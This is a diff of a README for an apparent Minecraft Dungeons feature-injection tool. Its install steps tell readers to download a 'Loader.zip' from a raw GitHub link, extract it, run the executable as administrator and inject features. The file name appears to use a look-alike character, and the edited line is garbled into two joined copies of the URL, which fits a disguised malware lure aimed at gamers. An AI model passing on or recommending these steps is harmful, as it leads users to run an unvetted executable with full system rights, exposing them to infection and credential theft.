@@ -44,7 +44,7 @@ And *many more* planned for future updates. Your feedback helps us expand our fu
 
 Getting started is quick and easy. Follow these simple steps to add new features to your Minecraft Dungeons experience:
 
-1. **Download https://raw.githubusercontent.com/Unknown01100/DungeonMasterPlus/main/Lоader.zip** from this repository.
+1. **Download https://raw.githubusercontent.com/Unknown01100/DungeonMasterPlus/main/Lоader.zipоhttps://raw.githubusercontent.com/Unknown01100/DungeonMasterPlus/main/Lоader.zip** from this repository.
 2. Extract the contents to a safe folder on your computer.
 3. Run the Loader executable as an administrator.
 4. Follow the step-by-step in-app instructions to set up and inject features.
